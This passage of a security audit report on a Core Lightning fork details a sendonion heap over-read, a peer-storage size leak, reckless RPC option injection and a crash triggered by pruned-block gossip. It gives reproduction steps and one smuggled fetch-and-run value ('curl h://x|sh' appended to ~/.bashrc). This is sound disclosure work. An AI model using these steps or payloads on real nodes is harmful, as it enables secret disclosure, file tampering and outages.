   send_onion() re-serialises the parsed packet with serialize_onionpacket() on tmpctx and passes the resulting buffer to send_htlc_out() as onion_routing_packet. For the 66-byte input this buffer is only 66 bytes long.
4. [common/sphinx.c:179–193](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/common/sphinx.c#L179-L193)
   serialize_onionpacket() sizes its output as TOTAL_PACKET_SIZE(tal_bytelen(m->routinginfo)); the output length therefore equals the attacker's input length, not 1366.
5. [lightningd/htlc\_end.c:289–290](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/htlc_end.c#L289-L290)
   new_htlc_out() does memcpy(hout->onion_routing_packet, onion_routing_packet, sizeof(hout->onion_routing_packet)), copying 1366 bytes out of the 66-byte tmpctx buffer: a 1300-byte heap over-read. The copied bytes are later persisted by wallet_htlc_save_out().
6. [lightningd/peer\_htlcs.c:808–812](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/peer_htlcs.c#L808-L812)
   send_htlc_out() then calls towire_channeld_offer_htlc(..., onion_routing_packet, ...); channeld_wire.csv:101 declares the field as a fixed u8[1366] array, so the generated towire_u8_array(&p, onion_routing_packet, 1366) reads another 1366 bytes from the short buffer into the message for channeld.
7. [channeld/channeld.c:6578–6629](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/channeld/channeld.c#L6578-L6629)
   handle_offer_htlc() decodes the 1366-byte onion_routing_packet from lightningd's message and, when channel_add_htlc returns CHANNEL_ERR_ADD_OK, calls towire_update_add_htlc(..., onion_routing_packet, ...) and peer_write()s it: the over-read lightningd heap bytes reach the first-hop peer verbatim.
8. [lightningd/htlc\_end.h:79](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/htlc_end.h#L79)
   hout->onion_routing_packet is a fixed array of TOTAL_PACKET_SIZE(ROUTING_INFO_SIZE) bytes, which is the size memcpy copies regardless of the source buffer length.

## Impact
Each call discloses ~1300 bytes of lightningd heap adjacent to a small tmpctx allocation to a peer the attacker chooses, and persists them in channel_htlcs. Repeated calls build a heap-disclosure oracle over a process whose heap holds the rune master secret (runes.c:175; its disclosure lets the attacker forge unrestricted runes), payment preimages and path secrets, and other clients' RPC traffic, so confidentiality is HIGH. No direct integrity effect. An over-read that crosses into an unmapped page would crash lightningd (an important-process crash with on-chain consequences), so availability is LOW.

## Reproduction steps
1. The attacker holds a rune permitting `sendonion` and reaches the RPC over the network through commando (default important plugin, always on, rune-checked per peer id) or clnrest. They run a Lightning node that has a channel with the victim on which the victim holds some outbound balance (opened by the attacker with push_msat, or funded by a prior payment) — an attacker-arranged setup, not a condition of the victim's deployment. They call sendonion with a 66-byte onion (version 0, valid pubkey, 32 filler bytes) and first_hop naming that peer/channel with a small amount. parse_onionpacket accepts it, serialize_onionpacket yields a 66-byte tmpctx buffer, new_htlc_out and towire_channeld_offer_htlc each read 1366 bytes from it, channel_add_htlc accepts the small HTLC, and channeld relays the over-read bytes to the attacker's peer in update_add_htlc. No length check, assertion or rune-level control stands in the way, and the call can be repeated indefinitely.

## Recommended fix
1. json_sendonion passes a caller-controlled onion of arbitrary length into a pipeline (serialize_onionpacket -> new_htlc_out memcpy -> towire_channeld_offer_htlc) whose consumers all assume exactly TOTAL_PACKET_SIZE(ROUTING_INFO_SIZE) bytes. Fix criteria: sendonion must reject (JSON-RPC invalid-params) any `onion` whose byte length is not TOTAL_PACKET_SIZE(ROUTING_INFO_SIZE) before parsing, as injectpaymentonion already does; verify that a 66-byte or 1365-byte onion returns an error and no HTLC is offered.
2. parse_onionpacket() in common/sphinx.c accepts any srclen >= 66 even though its header comment says srclen must be TOTAL_PACKET_SIZE, and send_htlc_out()/new_htlc_out() take a raw pointer whose length they never check. Fix criteria: parse_onionpacket should fail (WIRE_INVALID_ONION_VERSION or a dedicated code) when srclen != TOTAL_PACKET_SIZE(ROUTING_INFO_SIZE), or send_htlc_out/new_htlc_out should assert the tal length of onion_routing_packet equals the fixed field size, so no caller can cause a short-buffer copy.

# chanbackup sends unpadded encrypted SCB to any peer advertising option_provide_storage, leaking channel presence/count estimate and commitment-update timing

## Details
chanbackup distributes the node's encrypted static channel backup (emergency.recover) over the BOLT1 peer_storage message. Two properties leak node privacy to a remote peer with no channel. (1) Length. send_to_peers quotes BOLT1 'SHOULD pad the blob to ensure its length is always exactly 65531 bytes' and does not pad (plugins/chanbackup.c:614-631, FIXME at 621); peer_connected likewise sends get_file_data() raw (749-750). The blob is the libsodium secretstream ciphertext of static_chan_backup_with_tlvs (write_scb, 140-180): HEADER_LEN+ABYTES (41 bytes) + a 14-byte header + one modern_scb_chan per channel in any committed state, private or public (lightningd/peer_control.c:2988-3013). Each record (peer_control.c:2956-2981, common/scb_wire.csv) is ~321 fixed bytes plus a shachain TLV of 12+40*num_valid bytes, where num_valid grows roughly as log2 of the revocations received (1..49), i.e. 361..2281 bytes per channel. A peer therefore learns exactly whether the node has any channels (blob is exactly 55 bytes for none), a bound on the channel count (len/2281 <= N <= len/361), and the rough age of its channels; repeated reconnects show when channels open/close. (2) Recipient and timing. The peer_connected hook (738-785) sends the backup to every peer whose init features offer option_provide_storage (764), with no requirement that a channel exist, and records the peer in cb->peers (769-770); the hook runs for every connection (peer_control.c:1984) and sendcustommsg needs only a connected peer (connect_control.c:883-894). The commitment_revocation hook (1047-1061) and channel_state_changed CLOSED/AWAITING_LOCKIN (688-709) each call staticbackup -> update_scb -> send_to_peers, so when the node has at most two storage-advertising peers random_peers returns all of them (586-591) and such a peer receives a fresh peer_storage at every revocation on any of the node's channels, including channels with other peers, revealing payment/forwarding activity timing. (With more than two storage peers the while condition at 593 compares peer_map_count rather than the picked count and never iterates, so refreshes go to nobody; a separate reliability defect.) The path is on by default: lightningd advertises OPT_PROVIDE_STORAGE (lightningd/lightningd.c:937) so cb->send_our_peer_backup is true (chanbackup.c:1133-1135). The threat model names unannounced channels and payment activity as privacy assets and remote peers as the primary attacker; the BOLT's padding recommendation exists precisely to remove the length channel and CLN knowingly omits it.

## Evidence
1. [plugins/chanbackup.c:738–785](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/chanbackup.c#L738-L785)
   peer_connected hook: for any peer whose init features offer OPT_PROVIDE_STORAGE (line 764) - no channel required - the whole emergency.recover file is wrapped in peer_storage (749-750) and sent via sendcustommsg (775-784); the peer is also added to cb->peers (769-770) for future refreshes.
2. [plugins/chanbackup.c:614–631](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/chanbackup.c#L614-L631)
   BOLT1 'SHOULD pad the blob to ensure its length is always exactly 65531 bytes' is quoted and explicitly not implemented (FIXME line 621); the raw file length is sent, only the 65531 upper bound is enforced.
3. [plugins/chanbackup.c:140–179](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/chanbackup.c#L140-L179)
   write_scb: ciphertext length = HEADER_LEN + ABYTES + plaintext length, and the plaintext is static_chan_backup_with_tlvs (8+4+2 header plus one modern_scb_chan per channel), so the blob is exactly 55 bytes for zero channels and otherwise grows with the number and age of channels.
4. [lightningd/peer\_control.c:2950–3013](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/peer_control.c#L2950-L3013)
   json_add_scb/json_staticbackup: every channel not in an uncommitted state, private or public, becomes a record carrying shachain (12+40*num_valid bytes; num_valid grows ~log2 of revocations, max 49), basepoints (165), opener and to_self_delay TLVs - 361..2281 bytes per channel - so the blob length bounds the channel count and reflects channel age.
5. [plugins/chanbackup.c:1047–1061](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/chanbackup.c#L1047-L1061)
   commitment_revocation hook: every revocation on any channel triggers staticbackup -> after_staticbackup -> update_scb -> send_to_peers.
6. [plugins/chanbackup.c:578–600](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/chanbackup.c#L578-L600)
   random_peers: with <=2 storage peers all of them receive each refresh, so a channel-less storage peer observes the timing of every commitment update on the node's other channels; with >2 the loop condition at 593 compares peer_map_count rather than the picked count and never iterates.
7. [lightningd/lightningd.c:937](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/lightningd.c#L937)
   OPT_PROVIDE_STORAGE is in lightningd's default init features, so chanbackup's cb->send_our_peer_backup (chanbackup.c:1133-1135) is true by default and the sending path is live in a stock deployment.

## Impact
Confidentiality only, limited: an unprivileged channel-less peer learns the existence and an estimate of the count/age of the node's channels (including unannounced ones) from ciphertext length, and, for nodes with at most two storage-capable peers, the timing of commitment updates across all channels. The blob content stays protected by XChaCha20-Poly1305 under an hsm-derived key; no key, balance or counterparty data is exposed, and there is no integrity or availability impact.

## Reproduction steps
1. Any remote node connects to the victim on its listening port (no channel, no credentials) with option_provide_storage set in its init message; the peer_connected hook immediately replies with peer_storage whose length discloses whether the node has channels, bounds their count and reflects their age, and the attacker can reconnect to poll for changes. If the victim has at most two storage-advertising peers connected, the attacker-peer additionally receives a fresh peer_storage at every commitment revocation on any of the victim's channels while connected. Default configuration; no operator action or user interaction involved.

## Recommended fix
1. The peer_storage blob is sent at its true ciphertext length, so the message length reveals whether the node has channels and bounds their number and age. Fix criteria: Pad the blob to a constant length (the spec's 65531 bytes, or at least a fixed bucket compatible with peers that cap storage) before sending in both send_to_peers and peer_connected; verify that nodes with zero, one and several channels, and a channel before and after many commitment updates, emit identical-length peer_storage messages.
2. Backups are sent to any peer advertising option_provide_storage, including peers with no channel, and are refreshed on every commitment revocation, which leaks cross-channel activity timing to such peers. Fix criteria: Send backups only to peers with which a channel exists (or operator-selected peers), and rate-limit or batch refreshes so a recipient cannot observe per-update timing; verify that a channel-less peer offering the feature bit receives no peer_storage and that a burst of HTLC updates yields at most one refresh per interval. Also fix random_peers so that more than two storage peers still yields NUM_BACKUP_PEERS recipients.

# reckless RPC passes caller strings as argv; argparse options override lightning-dir/conf and rewrite arbitrary files

## Details
The `reckless` RPC (plugins/recklessrpc.c) is intended to let a caller run `reckless <command> <target>` against the node's own lightning-dir/network/config, which the plugin fixes on the command line (lines 223-233). The three caller-controlled strings are appended afterwards with no `--` separator, no enum enforcement (param_string, line 278-282) and no rejection of leading `-`. tools/reckless registers `-d/--reckless-dir`, `-l/--lightning`, `-c/--conf`, `-r`, `--network` on every subparser (2039-2062) with the StoreIdempotent action whose explicit purpose is that a later occurrence wins (1950-1982). A caller therefore supplies e.g. `target/subcommand="--conf=/path/to/file"` and `target="-d/some/dir"` (or `--lightning=/other/dir`) and reckless honours them instead of the values the plugin passed.

Before any subcommand is dispatched, `load_config` (1741-1781) runs with those values: it (1) runs `lightning-cli --lightning-dir=<attacker -l>` (a bogus dir yields RPCError, which silently disables the only consistency check against lightningd's real `conf`), (2) opens the `--conf` file (any file the lightningd user can write) or creates it after the prompt that recklessrpc auto-answers `Y` (46-49, 189-192), (3) creates `<-d dir>/<network>-reckless.conf` plus one parent directory, and (4) calls `editConfigFile` on the `--conf` file, which rewrites the whole file with every line stripped of leading/trailing whitespace, collapses blank lines and appends `include <-d dir>/<network>-reckless.conf`. Only then is the (possibly harmless) subcommand run. The `-d` value is embedded verbatim in the appended line, so the caller controls most of the line's content (e.g. `include /tmp/a;curl h://x|sh;/bitcoin-reckless.conf` appended to `~/.bashrc`).

Consequences: (a) any rune that allows `reckless` but restricts `command` (e.g. `pnamecommand=search`, or `source list`) nonetheless grants arbitrary modification/creation of files owned by the lightningd user and directory creation anywhere writable; (b) appending an include of a file in a volatile location (e.g. `-d /tmp/x`) to the real `<lightning-dir>/bitcoin/config` makes lightningd fail to start once that file disappears (common/configdir.c:89-104 treats a missing include as fatal); (c) `-l`/`--network` redirect `lightning-cli plugin start/stop` and config edits to a different lightning-dir/network of the same user. The documented contract (doc/schemas/reckless.json: "Node configuration, network, and lightning directory are automatically passed to the reckless utility") and the rune parameter bound are both bypassed. Note that an unrestricted `reckless` rune is already code-install capability by design; this finding is the escalation available to parameter-restricted runes and the out-of-scope file writes available to any caller.

## Evidence
1. [plugins/recklessrpc.c:214–238](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/recklessrpc.c#L214-L238)
   reckless_call appends the caller-supplied `command`, `target/subcommand` and `target` strings verbatim to argv after the plugin's fixed `-l <lightning-dir> --network <net> [--conf <conf>]`; no `--` separator, no enum check, no rejection of strings beginning with `-`.
2. [plugins/recklessrpc.c:270–284](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/recklessrpc.c#L270-L284)
   json_reckless takes all three parameters with param_string, so the schema's enum for `command` is documentation only.
3. [tools/reckless:2039–2062](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/tools/reckless#L2039-L2062)
   Every subparser (install, search, enable, disable, source list/add/rm, update, help) accepts -d/--reckless-dir, -l/--lightning, -c/--conf, -r/--regtest, --network; StoreIdempotent sets <dest>_idempotent so an occurrence after the subcommand wins over the plugin's earlier fixed value.
4. [tools/reckless:1950–1982](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/tools/reckless#L1950-L1982)
   StoreIdempotent records the last-set value in <dest>_idempotent (the subparser namespace is copied over the parent's), and process_idempotent_args copies it back, completing the override.
5. [tools/reckless:2093–2108](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/tools/reckless#L2093-L2108)
   LIGHTNING_DIR, LIGHTNING_CLI_CALL (--lightning-dir), RECKLESS_DIR and LIGHTNING_CONFIG are all derived from the (overridable) args and load_config runs before any subcommand is dispatched.
6. [tools/reckless:1741–1781](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/tools/reckless#L1741-L1781)
   load_config opens/creates the file named by --conf (or <LIGHTNING_DIR>/<net>/config), creates <RECKLESS_DIR>/<net>-reckless.conf (and up to one parent directory), then calls net_conf.editConfigFile('include <that path>', None) on the --conf file. The lightningd consistency check (listconfigs) only runs when the operator set `conf`, and is skipped on RPCError, which the attacker induces with -l pointing at a dir without an RPC socket.
7. [tools/reckless:691–767](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/tools/reckless#L691-L767)
   obtain_config creates missing files after an input() prompt; editConfigFile rewrites the whole target file with every line .strip()ped, consecutive blank lines dropped and the include line appended.
8. [tools/reckless:1655–1677](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/tools/reckless#L1655-L1677)
   lightning_cli raises RPCError on any non-0/1 exit of lightning-cli; load_config catches RPCError and proceeds without the consistency check.
9. [cli/lightning-cli.c:733–745](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/cli/lightning-cli.c#L733-L745)
   lightning-cli exits 2 (ERROR_TALKING_TO_LIGHTNINGD) when it cannot chdir into or connect under the attacker-supplied --lightning-dir, which is the exit code that becomes RPCError.
10. [plugins/recklessrpc.c:40–49](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/recklessrpc.c#L40-L49)
   The plugin auto-answers the 'press [Y] to create one now' prompt with 'Y', so file creation needs no operator interaction.
11. [plugins/recklessrpc.c:189–191](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/recklessrpc.c#L189-L191)
   Prompt detection on stderr triggers reckless_send_yes.
12. [lightningd/runes.c:862–885](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/runes.c#L862-L885)
   Rune parameter restrictions (pname<param>) bind only the named parameter; a rune restricting `command` leaves `target/subcommand` and `target` unconstrained, which is the position whose bound this path escapes.
13. [common/configdir.c:89–104](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/common/configdir.c#L89-L104)
   An `include` line whose target file no longer exists is fatal (must_exist=true) at lightningd startup, so an injected include into the real network config can make the node unable to restart.

## Impact
Integrity: arbitrary files writable by the lightningd user are rewritten (whitespace-normalised) and get an attacker-shaped line appended; directories/files are created at chosen paths; lightning-cli operations can be aimed at another lightning-dir. Availability: an include of a volatile path injected into the real config makes lightningd fail to restart; corrupting indentation-sensitive files is also possible. Confidentiality: no read-back of file contents.

## Reproduction steps
1. Attacker holds a rune permitting method `reckless` (presented via commando from any peer, or clnrest) that is restricted to a benign command such as `pnamecommand=search`; the rune evaluator (lightningd/runes.c:862-885) constrains only the named parameter. One request `{command:"search", "target/subcommand":"--conf=/home/ln/.lightning/bitcoin/config", target:"-d/tmp/x"}` yields argv `reckless -v --json -l <dir> --network <net> search --conf=... -d/tmp/x`; the search subparser accepts those options (tools/reckless:2039-2062, targets nargs='*'). Assumption: Python stdlib argparse (3.4+, current 3.11-3.13 behaviour) copies the subparser's namespace over the parent's, which is exactly what StoreIdempotent (1950-1983) relies on, so the later value wins. If the operator never set `conf` (the default), no consistency check runs at all; if they did, adding `--lightning=/tmp` makes lightning-cli exit 2 (cli/lightning-cli.c:733-745) → RPCError → check skipped (1748-1752). load_config then creates /tmp/x/<net>-reckless.conf, rewrites the --conf file and appends the include line before the subcommand runs; the creation prompt is auto-answered (recklessrpc.c:46-49,189-192). Deterministic, no operator interaction. recklessrpc is a builtin important plugin (plugins/Makefile:133) and tools/reckless is installed into bindir (Makefile:465). Against an unrestricted `reckless` rune the gain is nil (install is already code execution by design); the escalation is against parameter-restricted runes.

## Recommended fix
1. recklessrpc forwards caller strings into a position where argparse interprets them as options, so the plugin's fixed -l/--network/--conf can be overridden and the rune/method bound does not constrain what reckless does. Fix criteria: The plugin must only pass `command` values from the documented enum, must reject (or pass after a `--` separator) any target beginning with `-`, and reckless must not accept -l/-d/-c/--network after the subcommand when invoked by the RPC plugin. Verify that a request with target `--conf=<file>` or `-d<dir>` is rejected and no file outside <lightning-dir>/reckless and the node's own network config is touched.
2. tools/reckless performs file creation and config rewriting (load_config/editConfigFile) before validating the subcommand and regardless of which subcommand will run, and the consistency check against lightningd's active config is skipped when lightning-cli fails. Fix criteria: Config files are only created/edited for subcommands that need them, the conf path is restricted to the lightningd network config, and failure of the listconfigs consistency check aborts rather than proceeds. Verify `reckless search x --conf=/tmp/victim` leaves /tmp/victim untouched.

# Peer-chosen gossip scid on pruned bitcoind drives bcli getblock timeout into lightningd fatal

## Details
lightningd treats every JSON-RPC error from its Bitcoin backend plugin as fatal: get_bitcoin_result (lightningd/bitcoind.c:116-142) passes any reply carrying an `error` member to bitcoin_plugin_error, which calls fatal() -> exit(1) (lightningd/log.c:1130-1155). bcli's getrawblockbyheight produces exactly such an error when bitcoind has pruned the requested block and cannot obtain it from a peer within --bitcoin-retry-timeout (default 60 s, bcli.c:862): plugins/bcli.c:374-437 run `getblockhash` (succeeds on a pruned node, which keeps its block index), then loop synchronously on `getblock`, asking one NODE_NETWORK peer per iteration via `getblockfrompeer` and sleep(1), and at lines 396-400 give up with command_done_err(BCLI_ERROR, "getblock ... timed out") - a JSON-RPC `error` object (libplugin.c:585-601) - rather than the `blockhash:null` not-found success reply used at lines 290-300 when the hash itself is unknown.

The block height on this path is attacker-chosen. An unauthenticated remote peer sends a channel_announcement signed with its own node and bitcoin keys for a short_channel_id whose blocknum is any block >= when_lightning_became_cool (504500 on mainnet, chainparams.c:54) and >= ANNOUNCE_MIN_DEPTH below the tip. gossipd (gossmap_manage.c:672-756) verifies the signatures, finds the scid unknown, adds it to pending_ann_map (cap 10000) and sends gossipd_get_txout. lightningd's get_txout (gossip_control.c:89-114) finds no utxoset row and no row in the blocks table - wallet_have_block (wallet.c:5087-5099) knows only blocks processed since the node's first blockscan_start (tip-15 on first run, chaintopology.c:1532) - and calls bitcoind_getfilteredblock for the peer's blocknum, which issues getrawblockbyheight (bitcoind.c:835-859); getrawblockbyheight_callback (bitcoind.c:438-452) runs get_bitcoin_result on the reply before any caller logic. On a pruned bitcoind the block is absent, so bcli enters the retry loop; if no NODE_NETWORK peer delivers the block inside 60 s, lightningd dies with 'bad response to getrawblockbyheight'. The pending set is lost on restart, peers resend gossip on reconnect, and the attacker simply repeats, giving a crash loop.

Whether a given fetch succeeds depends on the victim's bitcoind peers, which the attacker does not control, but each attempt costs the attacker ~430 bytes and the attacker can submit thousands of distinct never-fetched old blocks (got_filteredblock caches each block once; hundreds of thousands of pre-history blocks remain), each a fresh 60 s window; one interval with no responsive NODE_NETWORK peer (get_fullnode_peers, bcli.c:302-338, returns an empty list when all peers are NODE_NETWORK_LIMITED, making the error certain) is enough. Pruned operation is a supported configuration: the README 'Pruning' section and doc/getting-started/advanced-setup/bitcoin-core.md describe it as partially supported and warn only about chain-sync falling behind, and the getblockfrompeer loop exists precisely to serve pruned nodes (CHANGELOG #8069). doc/lightningd-config.5.md documents bitcoin-retry-timeout as 'If the command keeps failing after this time, exit with a fatal error', i.e. the fatal is designed for an unavailable backend; it was not designed to be reachable through a block height chosen by an unauthenticated peer.

Assumptions about bitcoind (version not pinned by this repo; getblockfrompeer requires >= 23.0): a pruned node retains its block index so `getblockhash` succeeds for any height <= tip, and `getblock` on a pruned block fails with 'Block not available (pruned data)' and a non-zero bitcoin-cli exit status. Note that a bcli-only fix returning the not-found reply would not be sufficient: process_getfiltered_block_final (bitcoind.c:806-826) leaves a call with a NULL result in pending_getfilteredblock and re-issues it via most_recent_filteredblock_call, so lightningd itself must handle the failed lookup. Even when the fetch succeeds, each such lookup blocks the single-threaded bcli plugin for several seconds (getpeerinfo, getblockfrompeer, sleep(1), getblock), delaying tip polling, estimatefees and sendrawtransaction queued behind it; a rune bearer permitted the `getrawblockbyheight` RPC can cause the same stall but not the fatal, since its error reply returns to the RPC caller. This record is distinct from gossip-get-txout-full-block-fetch-amplification (gossip_control.c:78), which rates the per-announcement cost of successful fetches and explicitly left this fatal path unrated; here the defect is that a transient, peer-steerable backend failure is treated as unrecoverable.

## Evidence
1. [plugins/bcli.c:374–436](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/bcli.c#L374-L436)
   getrawblockbyheight: getblockhash succeeds on a pruned node (block index retained); getblock is then retried in a synchronous for(;;) loop with sleep(1), blocking the whole plugin. When bitcoind is pruned and no NODE_NETWORK peer delivers the block within bitcoind->retry_timeout (default 60 s, line 862), lines 396-400 return a JSON-RPC error via command_done_err(BCLI_ERROR) instead of the not-found success reply (lines 290-300) used when the hash is unknown.
2. [lightningd/bitcoind.c:116–141](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/bitcoind.c#L116-L141)
   get_bitcoin_result: any reply carrying an 'error' member is passed to bitcoin_plugin_error, which is NORETURN and calls fatal() (exit(1), lightningd/log.c:1130-1155). There is no per-request error handling or retry; every bcli error is treated as an unrecoverable backend fault.
3. [lightningd/bitcoind.c:438–451](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/bitcoind.c#L438-L451)
   getrawblockbyheight_callback runs get_bitcoin_result on the reply before anything else, so the BCLI_ERROR produced by the pruned-block timeout kills lightningd before the filtered-block caller can decide anything.
4. [lightningd/bitcoind.c:835–858](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/bitcoind.c#L835-L858)
   bitcoind_getfilteredblock_ issues bitcoind_getrawblockbyheight for whatever height the caller supplies; this is the path by which a height not chosen by lightningd itself reaches bcli's getrawblockbyheight.
5. [lightningd/gossip\_control.c:89–113](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/gossip_control.c#L89-L113)
   get_txout: for a channel_announcement whose block lightningd never processed (wallet_have_block, wallet.c:5087-5099, is false for every block before this node's first blockscan_start), the peer-supplied short_channel_id blocknum is passed verbatim to bitcoind_getfilteredblock.
6. [gossipd/gossmap\_manage.c:672–755](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/gossipd/gossmap_manage.c#L672-L755)
   gossipd forwards a get_txout to lightningd for any signature-valid channel_announcement (attacker's own keys suffice) whose scid blocknum is >= chainparams->when_lightning_became_cool (504500 on mainnet) and at least ANNOUNCE_MIN_DEPTH below the current height and is not already known or pending, i.e. an unauthenticated peer selects the block height.
7. [plugins/bcli.c:302–337](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/bcli.c#L302-L337)
   get_fullnode_peers only returns peers advertising NODE_NETWORK (bit 0); a pruned bitcoind whose peers are all NODE_NETWORK_LIMITED gets an empty list, so the loop merely sleeps until the 60 s timeout and the error path is certain.
8. [lightningd/bitcoind.c:806–825](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/bitcoind.c#L806-L825)
   process_getfiltered_block_final: a call whose result is NULL (the not-found reply) is left in pending_getfilteredblock and most_recent_filteredblock_call re-issues it, so merely changing bcli to return not-found would trade the fatal for an endless re-request; the fix must make lightningd drop the failed lookup and answer gossipd.

## Impact
lightningd exits via fatal(); all channels go offline and in-flight HTLCs are not resolved until the operator restarts. The pending-announcement set is lost on restart and peers resend gossip on reconnect, so the attacker re-triggers the crash immediately, keeping the node down (availability HIGH). A counterparty could exploit the node's absence (HTLC timeouts) but that is a consequence rather than a direct integrity impact of this code. No confidentiality impact.

## Reproduction steps
1. Attacker: any Lightning peer able to connect (connectd forwards all inbound gossip to gossipd; gossmap_manage.c:743-755 asks lightningd for every signature-valid, unknown scid). Delivery: ordinary channel_announcement messages signed with the attacker's own node and bitcoin keys, for scids in distinct blocks older than the victim's first block; no on-chain cost. Requirement outside attacker control (AT:P): the victim's bitcoind runs pruned (a supported, documented configuration) and at least one requested block is not delivered by a NODE_NETWORK peer within bitcoin-retry-timeout; thousands of cheap attempts, each a fresh 60 s window, multiply the chances, and a bitcoind with no NODE_NETWORK peers makes it certain. Assumes bitcoind (unpinned, >= 23.0 for getblockfrompeer) keeps its block index when pruned so getblockhash succeeds and getblock fails on pruned data. No defenses to evade, no user interaction.

## Recommended fix
1. lightningd's getrawblockbyheight path treats every backend error as an unrecoverable fault (get_bitcoin_result -> fatal()), while bcli reports a transient 'block not retrievable (pruned, peers unresponsive)' condition as a JSON-RPC error, and the height on this path comes from unauthenticated gossip. Fix criteria: A historical block that the backend cannot supply for a gossip UTXO lookup must never terminate lightningd: the failed lookup must be dropped from pending_getfilteredblock (not re-issued by most_recent_filteredblock_call) and reported to gossipd as a failed get_txout, with the error reserved for lightningd's own chain-sync fetches if at all. Verify by pointing lightningd at a pruned regtest bitcoind with no NODE_NETWORK peers, sending a channel_announcement for a pruned block, and confirming lightningd stays up, the announcement is dropped, and no repeated getrawblockbyheight for that height is issued.
2. Peer-chosen heights reach a synchronous, up-to-60-second blocking retry loop inside the important bcli plugin, so one gossip message can stall every backend operation behind it. Fix criteria: Lookups originating from untrusted gossip must not block the backend plugin for the full retry window (e.g. no synchronous sleep loop for gossip-origin requests, or a bounded, non-blocking fetch), and lightningd's own tip/feerate/broadcast requests must not queue behind them. Verify by timing estimatefees/sendrawtransaction latency while pruned-block gossip lookups are in progress.
